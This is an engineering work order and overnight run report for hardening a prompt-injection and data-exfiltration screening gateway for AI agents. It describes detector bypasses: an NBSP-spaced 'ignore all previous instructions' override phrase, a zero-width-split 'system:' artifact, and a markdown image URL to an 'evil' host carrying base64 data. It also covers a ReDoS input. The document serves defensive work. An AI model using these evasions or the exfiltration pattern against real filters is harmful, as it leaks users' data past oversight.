---
name: m9-switch-on-checklist
type: work-order
date: 2026-07-13
topics: [m9, security-gateway, screening, injection-defense, switch-on, live-test, launch]
status: open
description: >
  DOD-M9-SWITCH-ON-1 — what stands between the merged-but-off M9 security gateway and a real live
  test. The wiring is ONE hole (cello-daemon.ts never passes securityGateway), but the Fable-5
  security review found 7 substantive defects behind it that a switch-on would carry straight into
  production. This is the ordered checklist. NOT started; sequenced AFTER the pending publish cascade.
---

# `DOD-M9-SWITCH-ON-1` — from merged-but-off to live-tested

> ## ✅ THE OVERNIGHT RUN IS COMPLETE — items 1–13 done, 2026-07-13/14
>
> **Branch `m9-switch-on` in `cello-client` (worktree `../cello-client-m9`). 11 commits. Nothing published, nothing tagged.**
> Gate green after every item: **1,889 tests** (baseline 1,817 → **+72**), lint, typecheck, build.
>
> **SCREENING IS ON.** `cello-daemon.ts` spawns the gateway sidecar and passes a real client. Verified
> against the running binary, not just the suite: `security.gateway.started`, `mode=sidecar`, and the
> stores created under `~/.cello/` with zero operator configuration.
>
> **The three biggest finds were not on this list — and two of them this document had backwards:**
>
> 1. **A live remote DoS in `pii.ts`.** The checklist said `exfil.ts` was "the single hole in the RE2
>    discipline" and that `pii.ts` already went through `linear-regex`. Both halves were false.
>    `exfil.ts`'s patterns measure linear; the *actual* exploitable ReDoS was in the file the checklist
>    vouched for. `EMAIL_RE` keeps `.` inside the domain class → quadratic: **821 ms at 20 KB, 13 s at
>    80 KB, ~35 MINUTES at the 1 MB cap.** One long word from any counterparty hangs the gateway.
> 2. **RE2's `\s` is ASCII-only.** The naive RE2 port silently NARROWED five detectors (it omits `\v`,
>    NBSP, U+2000–200A, U+2028/9, U+FEFF). `ignore<NBSP>all<NBSP>previous<NBSP>instructions` — the exact
>    phrase the outbound hijack block exists to catch — came back `allow`. **The whole suite was green.**
>    Caught in review, fixed with a class verified exhaustively over every codepoint on both engines.
> 3. **The secrets cap was a leak.** Past 1,000 matches the scanner stopped and emitted the remainder
>    VERBATIM, under a `redact` verdict that made it look handled. Also found `pkcs12-file`: an EMPTY
>    regex with NO keywords, so it ran on every message, matched once per character, could never detect
>    anything — and cost ~1 GB of string copying per message in the old offset loop.
>
> **Also fixed, all confirmed real:** C1 (the invisible-strip was *assembling* the payload one step too
> late to be checked), C2 (inbound `redact`-without-content delivered the attacker's ORIGINAL text —
> the two seams disagreed and this one pointed the wrong way), C3, C6 (`verifyChain()` was written,
> tested, and never called), C7 (the language filter was ON by default, silently dropping non-Latin
> mail), A1–A5, B1, B2, E1.
>
> **Two bugs I introduced and the tests caught:** spawning the gateway *before* the singleton lock (a
> daemon that lost the race unlinked the winner's socket and orphaned itself — both DOD-SINGLE-DAEMON-1
> and A2 in one line); and a startup window where the gateway child existed but no signal handler did.
>
> **D1′ was a FALSE ALARM** — already proven. I journaled it and did not pad it. (I did close a real gap
> it exposed: the `allow_once` path, the one decision that actually *releases* data, had never crossed
> the real process boundary.)
>
> **B2 answered backwards too:** 2 s was never too *short*. Worst case is bounded at **~380 ms** at the
> 1 MB cap. Table + recommendation in Part B. **The number is still yours to set.**
>
> **⛔ NOT DONE, deliberately: Part F (the live test).** Needs two daemons, a real relay, and killing a
> process by hand. Also not done: tagging, publishing, the `latest` promotion. **A publish cascade is
> prepared but nothing is tagged.**
>
> **One thing to know before you read the diff:** `M9-SECURITY-REVIEW-FABLE5`'s verdict — *"the design
> is genuinely good… nothing found that lets an attacker forge a verdict over the wire"* — still holds.
> Every defect above is in the **detectors and the defaults**, not the architecture. The load-bearing
> security design was right; what was wrong was what it was configured to do, and one regex.

> ## ⚠️ VERIFY EACH CLAIM AGAINST THE CODE BEFORE ACTING ON IT.
>
> **This document, and the M9 DoD, have each been confidently WRONG about the code — in opposite
> directions — and both were caught only by reading the source (2026-07-13):**
>
> - **This checklist said D1 (the governance re-send) was "NOT BUILT" and "security-critical".** It is
>   **fully built**, end to end, and the hard parts are right. **It was the single largest item on this
>   list.** Struck below.
> - **The M9 DoD says the IN-003 language allowlist is "NOT yet wired live."** The code **blocks**, by
>   default, with no configuration at all. The DoD is wrong. See C7.
>
> The wiring items (A1, A3) were verified TRUE. The lesson is not "the doc is bad" — it is that a plan
> document drifts from the code in BOTH directions, and an overnight run that trusts it will build
> something that exists and skip something that doesn't. **Read the source first. Every time.**

**Sequencing (Andre, 2026-07-13): the pending publish cascade goes FIRST.** A lot of code changed
today (the dead-code purge, the daemon decomposition, DOD-AGENT-PARAM-1, DOD-SESSION-NAME-1). Ship
and live-test *that* before adding a whole security layer on top of it. Debugging a screening
regression on top of an unproven daemon is two problems wearing one coat. **Do not start this work
until the cascade is published and exercised.**

## Where we actually are

The M9 gateway is **merged, published, and shipping** — it is not missing, and this is not a build
job. `@cello-protocol/gateway@0.0.2` is a real published package (not private), it is already a
dependency of `core/daemon`, it has its own `cello-gateway` binary, and it is fully env-configured.
Both screen compositions are wired (inbound: sanitizer + injection patterns + language + scanner-
when-loaded; outbound: rate-limit + secrets + PII + exfil). `spawnGatewaySidecar()` +
`LocalSidecarGatewayClient` are the exact API the green `m9-gate-1` test already drives.

**The wiring gap is one line, at one place:**

```
core/daemon/src/bin/cello-daemon.ts:74
  const handle = await startDaemon({ celloDir, socketPath, ... });   // no securityGateway
```

…so `daemon.ts:232`'s default wins: `config.securityGateway ?? new PassthroughGatewayClient()`.
This is a **conscious decision, already known** — it is not news and does not need re-discovering.
M9-GATE-1's own done-condition was a harness that spawns the gateway itself, so the gate went green
honestly; the operator-facing composition root was simply never in scope.

**The Fable-5 security review is the reason this is more than a one-line change.** It read every
non-test source file under `core/gateway/src/` plus the full daemon-seam diff, and its verdict on
the design is worth quoting, because it changes how you should read the defect list below:

> *"The design is genuinely good. The fail-closed plumbing (client/server/timeouts), the
> loosen-confirm config gate, the hash-chained records, the terminal-vs-transient inbound split, and
> the RE2 discipline in the detectors are all correct and carefully reasoned. The detectors have
> honest, documented coverage limits. This is not sloppy work."*

and, on the highest-value attacks:

> *"**Nothing found** that lets an attacker forge a verdict over the wire, that lets the daemon
> override the PII/override gate, or that makes the fail-closed client silently allow — those were
> the highest-value targets and they hold."*

So the load-bearing security architecture holds. What follows is a switch-on checklist plus seven
real defects in the *detectors* and *defaults* — the kind that get carried into production the day
you flip the switch, and are far cheaper to fix before that than after.

---

## 🌙 THE OVERNIGHT RUN — scope, order, and the autonomy boundary

**Andre is NOT available. Nothing in this run may wait on him.** Anything that needs a decision, a
credential, a human hand, or reaches a real counterparty is OUT OF SCOPE — do it in the morning.

### ⛔ OUT OF SCOPE — do not attempt, do not "just try"
| | why |
|---|---|
| **Part F (the live test)** | Needs two daemons, a real relay, and killing a process by hand. A green tick from a faked version is worse than no tick. |
| **The `latest` promotion** | Operator-run, always. Andre's explicit go. Never automate it. |
| ~~A5, B1~~ | ✅ **BOTH DECIDED 2026-07-13 — now IN SCOPE.** A5 = option 1 (operator sets it explicitly, prompted at first login). B1 = refuse-to-start. **There are no open decisions left; nothing in this run waits on Andre.** |
| **Publishing the cascade** | A `daemon + cli + connect + gateway` cascade is needed at the end. **Prepare it, tag NOTHING.** Load `/cello-publish` in the morning. |

### ✅ IN SCOPE, in dependency order — each ends with the full gate + a commit
1. **C4** (RE2 discipline) — smallest, isolated, and it is a *guard* the later fixes benefit from.
2. **C1** (strip-before-artifact ordering) — one-line reorder in `exfil.ts`, big security win.
3. **C3** (path-based image exfil) — same file as C1; do them together, one gate.
4. **C5** (secrets cap → block, never leak the overflow) — `secrets.ts`.
5. **C2** (inbound redact-without-content must fail CLOSED) — `session-node-manager.ts:3400`. **Touches
   the daemon, not the gateway** — separate commit, separate gate.
6. **C7** (language allowlist ⇒ opt-in; unset = NOT COMPOSED) — `screen/inbound.ts` + `detect/language.ts`.
   Log INACTIVE at boot.
7. **C6** (`verifyChain` at boot; refuse to start on a broken chain) — depends on nothing, but do it
   after the detectors so a chain refusal cannot mask a detector failure while you are iterating.
8. **A3** (the kill switch: `CELLO_SECURITY=off` → `PassthroughGatewayClient`). **Before A1. Always.**
9. **A4** (real defaults for the socket / config-db / request-log under `~/.cello/`).
10. **A1 + A2 + E1 — IN ONE COMMIT.** Spawn the sidecar, pass the client, kill the child on shutdown,
    **and flip the docs in the same change.** `SKILL.md`/`README` currently say content is screened —
    **false today, true the moment A1 lands.** They must never be out of step, in either direction.
11. **A5** (the `cello pii-whitelist` surface + the first-login prompt). Independent of the gateway
    fixes; do it after the wiring so you can prove it end-to-end.
12. **B2 (the benchmark)** — measure, publish the table here, propose a deadline. **Do not set it
    unilaterally**; leave the number as a recommendation.
13. **D1′** — verify the `flagId` round trip across the real daemon↔sidecar boundary.

### The rules for the run
- **The full gate after EVERY item**: `pnpm test` → `lint` → `typecheck` → `build`. Never batch.
- **Verify every claim against the source before acting on it.** This document was wrong once already
  (D1), and the M9 DoD is wrong in the other direction (C7). *Read the code first.*
- **A failing test is fixed, never attributed.** If something goes red that you did not touch, trace
  it — do not re-run hoping for green, and do not call it flaky.
- **If an item turns out to be a false alarm — STOP, journal it, move on.** Do not invent work to fill
  the night.
- **Stop and report rather than guess** on anything that reaches a counterparty, a bill, or a publish.
- **Commit after every item** with the finding and the fix in the message. The commit is the report.

---

## Part A — wire it on

- [ ] **A1. Spawn the sidecar and pass the client.** In `core/daemon/src/bin/cello-daemon.ts`, call
      `spawnGatewaySidecar()`, build a `LocalSidecarGatewayClient`, pass it as `securityGateway` to
      `startDaemon()`. `core/daemon/src/__tests__/m9-gate-1.test.ts:89-93` is the reference
      implementation — it already does exactly this, against real processes.
- [ ] **A2. Child lifecycle — kill the gateway on daemon shutdown.** Hook the existing
      `handle.stop` / SIGTERM path. **An orphaned gateway holding a socket is the same failure class
      as the orphan daemons `DOD-DAEMON-CLEANUP-1` / `DOD-SINGLE-DAEMON-1` just fixed.** Do not
      recreate that bug in a new process. Unlink the gateway socket only if we own it.
- [ ] **A3. The kill switch.** An explicit env flag (e.g. `CELLO_SECURITY=off`) that falls back to
      `PassthroughGatewayClient`. **Build this BEFORE flipping the switch, not after.** The launch
      bar names a kill switch as a first-class requirement; the first time screening misfires on a
      real conversation you will want it to already exist.
- [ ] **A4. Paths under `~/.cello/`.** `CELLO_GATEWAY_SOCKET` (required), `CELLO_GATEWAY_CONFIG_DB`,
      Give them real defaults; do not make the operator set env vars. (`CELLO_GATEWAY_REQUEST_LOG`
      was here too — DELETED 2026-07-30 with the plaintext request log itself, M8C
      `DOD-CRYPTO-AT-REST-1`. Do not re-add it.)
- [ ] **A5. The PII whitelist — DECIDED: OPTION 1, the operator sets it explicitly (Andre, 2026-07-13).**

      **What it actually is:** a plain `string[]` (`core/gateway/src/detect/pii.ts:34`) — a list of the
      operator's OWN PII values (email, phone) that the outbound detector lets through **silently**.
      Nothing cryptographic; "seed" here just means pre-populate. Today it is a comma-separated env
      var (`CELLO_GATEWAY_PII_WHITELIST`). Anything NOT on it produces a **warn** — message not sent
      until the agent answers `redact` / `allow_once` / `allow_always`.

      Unseeded, writing *"reach me at andre@mygentic.ai"* **warns and does not send** — your own email
      treated as a leak. That is the bad first impression.

      **The original A5 ("seed from the registered identity") IS IMPOSSIBLE and must not be attempted:
      the daemon has no email, BY DESIGN** (no PII in the directory — hash-only; the portal holds the
      recoverable copy). Do not go looking for it.

      **Build instead:**
      - A `cello` CLI surface to manage the list — e.g. `cello pii-whitelist add|remove|list <value>`,
        persisted where the gateway reads it (config store, not an env var the operator must export).
      - **Prompt on first `cello login`** ("what email/phone are yours? we will never flag them"),
        skippable, and never nagged twice.
      - The gateway reads the persisted list; the env var stays supported as an override.

      **Done when:** a fresh operator sets their own email once, and a message containing it sends
      silently with no warn. **Note `allow_always` already writes to this list** — so option 1 is a
      convenience layer over machinery that already works, not a prerequisite for it.

## Part B — decide the failure policy BEFORE flipping (not after)

> **Still OPEN and blocking the overnight work — Andre's call:**
> - **B1** (below): if the sidecar fails to spawn, does the daemon refuse to start, or start unscreened?
> - **D1** (Part D): `warn` is a dead end — build the governance re-send, or accept warn == blocked for
>   the trial and script around it?
>
> **DECIDED 2026-07-13:** C7 (allowlist is opt-in; empty ⇒ inactive, and loudly so) and B2 (benchmark
> the deadline, including against message size — do not guess).

- [ ] **B1. Startup-failure policy — THE ONLY DECISION STILL OPEN.** If the sidecar fails to spawn,
      does the daemon refuse to start, or start unscreened? Fail-closed is the designed behavior for
      an *unreachable* gateway at runtime; the *startup* case is separate and currently unmade. (No
      code exists either way — verified.) The review is explicit that **production should not be
      *able* to run passthrough** — the A3 flag should be the ONLY route to it.

      **✅ DECIDED (Andre, 2026-07-13): REFUSE TO START.** With an error naming the cause and the
      escape hatch.
      Starting unscreened is a *silent security downgrade on a bad day*: the operator gets no signal,
      while `SKILL.md` tells them their messages are screened (E1). That is the absent⇒fine pattern in
      its purest form. A loud refusal costs a minute; a quiet passthrough costs the operator the thing
      they installed CELLO for — and you cannot un-leak a message. It is also the reversible choice:
      you can always loosen it later.

      **Condition: A3 (the kill switch) must exist BEFORE the switch is flipped.** Refuse-to-start
      without an escape hatch is a trap.
- [ ] **B2. The deadline — DECIDED: BENCHMARK IT, DO NOT GUESS (Andre, 2026-07-13).** `m9-gate-1`
      runs with `deadlineMs: 2000`. That number is the whole never-hang guarantee (INV-6: *a timeout
      is a verdict, not a hang*), and **2s may well be too short** — it was a test value, never a
      measured one. Before imposing any number:
      - **Measure the real screen latency** for both compositions (inbound: sanitizer + injection
        patterns + language + scanner; outbound: rate-limit + secrets + PII + exfil), on real content.
      - **Measure it as a FUNCTION OF MESSAGE SIZE.** The detectors are regex sweeps over the content,
        so expect roughly linear in length — but "expect" is not a measurement. If latency grows with
        size, a single fixed deadline is wrong: a large legitimate message would time out into a
        fail-closed BLOCK, which reads to the operator as a security refusal rather than a timeout.
      - THEN pick the deadline, with headroom, and confirm it sits below the MCP host timeout.
      A deadline set by guess is a self-inflicted denial of service on your own users.

      **Deliverable: a benchmark, not an opinion.** Screen latency (p50/p95/max) for both compositions
      at, say, 1 KB / 10 KB / 100 KB / 1 MB (the content cap). Publish the table in this document. The
      deadline is then a number with headroom over the measured p95 at the cap — not a round figure
      someone liked.

      ### ✅ MEASURED, 2026-07-13 — and the premise was wrong

      Measured through the **real sidecar** (spawn → unix socket → framing → screen → reply), because
      that full round trip is what the client's deadline actually bounds. An in-process measurement of
      the detectors alone would flatter the number and miss the thing that times out. Records DB on
      (production writes a row per message). Realistic prose, 25 iterations after 5 warmup.
      Bench: `core/daemon/src/__tests__/b2-screen-latency-bench.ts`.

      | direction | size | p50 | p95 | max |
      |---|---|---|---|---|
      | inbound | 1 KB | 0.5 ms | 0.6 ms | 0.7 ms |
      | inbound | 10 KB | 1.8 ms | 1.9 ms | 1.9 ms |
      | inbound | 100 KB | 16.0 ms | 17.2 ms | 17.3 ms |
      | inbound | **1 MB (the cap)** | 162.9 ms | **164.7 ms** | 167.6 ms |
      | outbound | 1 KB | 0.6 ms | 0.7 ms | 0.7 ms |
      | outbound | 10 KB | 3.7 ms | 4.3 ms | 4.4 ms |
      | outbound | 100 KB | 34.7 ms | 35.8 ms | 36.1 ms |
      | outbound | **1 MB (the cap)** | 374.9 ms | **377.2 ms** | 377.4 ms |

      **The worry was backwards: 2s was never too SHORT.** Latency is linear in message size
      (~0.16 ms/KB inbound, ~0.38 ms/KB outbound — the detectors are regex sweeps, so this is the
      expected shape, now measured rather than assumed). And because the daemon caps content at
      **1 MB**, the worst case is BOUNDED: no message can cost more than ~380 ms. A single fixed
      deadline is therefore fine — the size-dependence that would have broken it is capped out of
      relevance.

      **RECOMMENDATION (not a decision — the number is yours):** leave it at the client's default
      **5000 ms**. That is **13× headroom** over the measured worst case, survives a 2× loaded machine
      with 6× to spare, and sits far under any MCP host timeout (~60 s). It is already what production
      runs: `resolveSecurityGateway` passes no deadline, so `LocalSidecarGatewayClient`'s default
      applies, and `CELLO_GATEWAY_DEADLINE_MS` overrides it. **Nothing was set unilaterally.**
      (`m9-gate-1`'s test value of 2000 ms is also fine — 5× headroom — and needs no change.)

      **⚠️ THE ONE THING THAT INVALIDATES THIS TABLE:** IN-002 / DeBERTa is OFF (no model, D2). It is a
      neural inference, not a regex sweep — orders of magnitude slower, and NOT linear in the same way.
      **If Layer-2 is ever switched on, this benchmark must be re-run before the deadline is trusted.**

## Part C — the Fable-5 review's findings (`M9-SECURITY-REVIEW-FABLE5.md`)

> **✅ ALL SIX VERIFIED AGAINST THE SOURCE, 2026-07-13.** Unlike D1, every one of these is REAL, and
> the file:line for each is given below. The Fable-5 review was accurate. Fix them; do not re-litigate.

Findings #1 (inert layer) and #2 (plaintext stores) are tracked elsewhere — #1 is Part A of this
document, #2 is `DOD-CRYPTO-AT-REST-1` in [[M8C-DEFINITION-OF-DONE]]. **The remaining seven are new
work that belongs to this switch-on**, because flipping the switch is what makes them exploitable.

- [ ] **C1. MEDIUM — outbound injection-artifact BLOCK is evadable with a zero-width character.**
      ✅ **CONFIRMED — `core/gateway/src/detect/exfil.ts:55-70`.** Step 1 runs `findInjectionArtifact`
      on the RAW text and blocks; step 2 then runs `stripInvisible`. So `sys\u200btem:` misses the
      anchored artifact patterns in step 1, gets cleaned to `system:` in step 2, and **is sent**.
      **Fix:** strip invisible FIRST, then test for artifacts (make outbound match inbound's order).
      **Done when:** a test sends a zero-width-laced artifact and gets `block`, not `redact`.
- [ ] **C2. MEDIUM — inbound `redact`-without-content fails OPEN.**
      ✅ **CONFIRMED — `core/daemon/src/session-node-manager.ts:3400`:**
      `disposition === "redact" && content !== undefined ? verdict.content : content` — i.e. a redact
      with no content **delivers the ORIGINAL**. The outbound seam does the opposite on the identical
      case (`session-content-handlers.ts:212` treats it as a BLOCK, with a comment calling it "the one
      place M9 could fail OPEN"). The two seams disagree, and the inbound one points the wrong way.
      **Fix:** make inbound fail CLOSED, mirroring outbound. **Done when:** a redact verdict with no
      content drops the message and logs, rather than delivering the unredacted original.
- [ ] **C3. MEDIUM — path-based image exfil is not caught.**
      ✅ **CONFIRMED — `core/gateway/src/detect/exfil.ts:75`:** `if (url.includes("?"))`. Only
      query-string URLs are neutralized, so `![](http://evil/<base64-data>)` walks past.
      **Fix:** neutralize any image URL whose path carries a data-shaped segment, not just `?`-queries.
      **Done when:** a path-carried payload is neutralized.
- [ ] **C4. MEDIUM — outbound exfil patterns use native `RegExp`, not RE2.**
      ✅ **CONFIRMED — `core/gateway/src/detect/exfil.ts:34`:** `const ARTIFACT_PATTERNS: RegExp[]`,
      while `pii.ts`, `sanitize.ts`, `injection-patterns.ts` and `secrets.ts` ALL go through
      `linear-regex`. `exfil.ts` is the single hole in the project's own ReDoS discipline — and it
      matches against adversary-controlled content. **Fix:** route it through `linear-regex` like its
      siblings. **Done when:** no native `RegExp` remains in `detect/`, and a lint/test guard stops
      the next one being added.
- [ ] **C5. LOW — secret redaction caps at 1000 matches per rule, and outbound has no size cap.**
      ✅ **CONFIRMED — `core/gateway/src/detect/secrets.ts:86`:** `while (offset < text.length &&
      guard++ < 1000)`. Past 1000 matches the loop stops and **the overflow secrets are emitted
      verbatim.** There is no outbound size cap to bound it (the daemon's 1 MB `MAX_CONTENT_BYTES` cap
      is the only ceiling, and 1 MB holds far more than 1000 keys). **Fix:** on hitting the cap, do not
      fall through to send — BLOCK (or truncate-and-block). Never emit the remainder.
      **Done when:** a message with >1000 secrets is blocked, not partially redacted.
- [ ] **C6. LOW — neither store calls `verifyChain` at gateway boot.**
      ✅ **CONFIRMED:** `verifyChain()` EXISTS (`config/config-store.ts:211`, and on the record store)
      but is **never called** from `bin/`, `server.ts` or `spawn.ts`. A tampered local config DB is
      trusted. **This and `DOD-CRYPTO-AT-REST-1` are two halves of ONE hole** — plaintext on disk makes
      the tamper trivial; no boot-time verify makes it undetected. Fixing one alone leaves it open.
      **Fix:** call `verifyChain()` on both stores at gateway boot; refuse to start on a broken chain.
      **Done when:** a hand-edited config row makes the gateway refuse to start, loudly.
- [ ] **C7. DECIDED (Andre, 2026-07-13) — the language allowlist is OPT-IN: EMPTY ⇒ INACTIVE.**
      The IN-003 allowlist is currently LIVE and blocking — it terminally drops **all confident
      non-Latin inbound**, while the M9 DoD claims it is "NOT yet wired live." The DoD is wrong; the
      code blocks.

      **The rule:** an **empty allowlist means the filter is OFF and everything is allowed.** It
      becomes active only when an operator explicitly sets one. Correct for this heuristic: it is
      trivially evaded, so its realistic failure is a **false positive** — silently dropping a
      legitimate counterparty's message — not a false negative. Nobody should have a language filter
      they never asked for.

      **⚠️ BUT: an inactive security layer must NEVER be SILENTLY inactive.** "Absent config ⇒ allow
      everything" is structurally the same shape as the absent⇒fine defect class this milestone spent
      a week killing. The difference is that here it is *intended* — which obliges us to make it
      LOUD, not to hide it:
      - the gateway **logs at boot** that the language filter is INACTIVE (and, when set, what the
        allowlist is);
      - `cello status` (or the gateway's own status surface) can show it;
      - the default must be visible in the docs, not discovered.

      **The code, precisely** (verified 2026-07-13 — it blocks by DEFAULT, with zero configuration):
      - `core/gateway/src/screen/inbound.ts:93` composes it **unconditionally**:
        `screenInboundLanguage(deliveredText, this.#language ?? {})`
      - `core/gateway/src/detect/language.ts:67` then defaults to Latin-only: `opts.allow ?? ["latin"]`
      - → a confident non-Latin inbound message is a **TERMINAL block** (`inbound_language_blocked`),
        dropped and never delivered, for an operator who configured nothing.

      Implement as: **unset/empty allowlist → the detector is NOT COMPOSED into the inbound screen at
      all.** Not "composed but always passes" — *not composed*, so it cannot misfire and costs no
      latency. Then log at boot that the filter is INACTIVE.

## Part D — the gap that will bite in the first live test

- [x] **~~D1. The stateless governance re-send is NOT BUILT.~~ ❌ FALSE — IT IS BUILT. Verified in
      the source, 2026-07-13. Nothing to do here; `warn` is NOT a dead end.**

      All four links traced:
      - **MCP shim** — `core/adapter-claude-code/src/bin/cello-mcp.ts:275` exposes `governance_decisions`
        with a full zod schema.
      - **Daemon** — `core/daemon/src/session-content-handlers.ts:135` parses + shape-validates it,
        threads `governanceDecisions` into `screenOutbound`, and returns `governance_warn` with `flags`.
      - **Gateway transport** — `client.ts` → `protocol.ts` → `server.ts` all carry it.
      - **Gateway screen** — `core/gateway/src/screen/outbound.ts:130` **APPLIES it** (`#resolvePII`).

      And it is not a stub — the hard parts are right: `allow_once`/`allow_always` are honored **only**
      when `autonomous_override` is on, else **rejected → re-warn**; if ANY flag is rejected the whole
      send re-warns (**nothing goes out half-decided**); `allow_always` under autonomous mode degrades
      to allow-once **plus a whitelist-add REQUEST**, because persisting is a human action; and a rate
      slot is committed **once**, not twice across the warn → re-send round trip. `M9-FEED-001` is
      ✅ EARNED in the M9 DoD, explicitly including this flow, with a warn round-trip proven by test.

- [ ] **D1′. The ONE thing to actually verify (and it is cheap).** The wiring exists but has never run
      through a real operator install. Confirm the **`flagId` round trip**: the ids the daemon hands
      back in `flags` must be the SAME ids the gateway expects in `governance_decisions`. That is the
      classic seam where a flow like this breaks, and an in-process test that drives both halves can
      miss it. Test it across the real daemon↔sidecar boundary, not in one process.
- [ ] **D2. IN-002 / DeBERTa stays OFF.** Deferred by decision (Andre, 2026-06-23) pending the 568 MB
      model + runtime infra. Absent model → Layer-2 off, graceful. Fine for a live test — just know
      that **semantic** injection detection is not in it; only Layer-1 deterministic patterns are.

## Part E — truth in the shipped docs

- [ ] **E1.** `core/adapter-claude-code/SKILL.md` and `README.md` currently tell operators that
      message content is screened. That is **false today** and becomes **true the moment A1 lands**.
      Flip the wording **in the same change** — never before. (See also the standing rule in
      `.claude/CLAUDE.md`: no tool description may claim screening is active while the daemon runs
      passthrough.) `cello_contact_set_tier`'s description carries the same disclaimer and needs the
      same edit.

## ⛔ Part F — CANNOT BE DONE UNATTENDED. Do not attempt it in an overnight run.

**Everything below needs a human at the wheel**: two real daemons, two agents, a real relay, and
F6 is literally *kill the gateway process mid-session*. Its precondition is also that the publish
cascade is **published AND exercised** — which is a separate, human-run step.

**An overnight run stops at the end of Part E and reports.** Part F is a next-morning job, done
together. Attempting it unattended produces a green tick that means nothing, which is worse than not
running it.

## Part F — the live test (two real daemons, two agents, real relay)

The M9 gate proved this loop against real processes on one machine. This is the same loop, driven by
hand through the actual operator install, which is the part that has never run.

- [ ] **F1.** Clean message → delivered unchanged.
- [ ] **F2.** AWS key in an outbound message → **redacted**, and the agent is TOLD what was removed.
- [ ] **F3.** Invisible / confusable characters inbound → **sanitized**, notes reach the agent.
- [ ] **F4.** A bulk contact dump outbound → **one** warn, not sent (not N warns).
- [ ] **F5.** Over-rate sends → throttled, with a distinct reason + guidance.
- [ ] **F6. Kill the gateway mid-session → fail-closed BLOCK with a verdict, never a hang.**
      **This is the most important one.** It is INV-6 (*"the feedback channel never lies and never
      hangs"*) and the fail-closed floor, tested the only way that counts: by killing the process.
- [ ] **F7.** The records DB holds a row per screened message (clean passes too) and the hash chain
      verifies.
- [ ] **F8.** The kill switch (A3) actually turns it off, and the daemon still works.

## What this does NOT include

- **Phase 2** (`M9-REMOTE-001`, `M9-ATTEST-001`, `M9-GATE-2`) — the remote mTLS gateway and directory
  attestation. Explicitly "add later, when a customer needs it." Not launch scope.
- **`DOD-CRYPTO-AT-REST-1`** — the plaintext stores. Tracked in [[M8C-DEFINITION-OF-DONE]]. **Does
  not block the live test; DOES block shipping.** Note C6 above: it is half of a hole.

## Publish

Wiring the daemon means a **daemon + cli + connect cascade** (and `gateway` if C1–C6 touch it). Load
`/cello-publish` for THAT publish. Not part of this work order's "done".

## Related

- [[M9-SECURITY-REVIEW-FABLE5]] — the source of Part C. Read it before touching a detector.
- [[M9-DEFINITION-OF-DONE]] — Phase-1 11/12 gate-green, 1 deferred; the ✅s carry named breadth
  caveats (IN-001: only confusables-redact live; OUT-001: only the AWS-key rule live) that are worth
  re-reading before trusting the table.
- [[M8C-DEFINITION-OF-DONE]] — `DOD-CRYPTO-AT-REST-1`.
